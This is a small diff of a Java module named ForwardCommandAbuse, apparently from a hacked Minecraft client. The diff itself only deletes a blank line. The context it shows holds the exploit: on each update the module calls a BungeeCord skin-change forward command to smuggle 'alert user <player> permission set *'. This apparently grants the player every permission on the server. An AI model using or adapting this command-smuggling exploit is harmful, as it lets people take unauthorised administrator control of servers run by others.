@@ -25,6 +25,5 @@ public class ForwardCommandAbuse extends Module {
 	@Handler
 	public void onUpdate(EventUpdate e) {
 		BungeeChannelUtil.ChangeSkinForwardCommand("alert", "user " + Minecraft.getMinecraft().getSession().getUsername() + " permission set *", false, false);
-		
 	}
 }
